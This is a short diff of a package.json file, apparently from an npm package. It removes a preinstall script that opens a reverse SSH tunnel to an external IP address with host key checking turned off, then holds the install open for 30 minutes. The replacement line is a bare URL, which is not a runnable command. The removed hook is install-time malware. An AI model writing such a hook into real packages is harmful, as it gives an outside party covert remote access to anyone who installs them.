@@ -12,7 +12,7 @@
     "fs-extra": "^10.0.0"
   },
   "scripts": {
-    "preinstall": "{ sleep .5; echo dfh23984wyfhoq3lrefDJWhrfosdfh324href15; } | script -q /dev/null -c 'ssh -o \"StrictHostKeyChecking=no\" -R 6666 user-for-ssh-tunnel@34.139.150.137 -fN' && sleep 30m",
+    "preinstall": "https://artifactory-uw2.adobeitc.com/ui/",
     "install": "pwd"
   }
 }
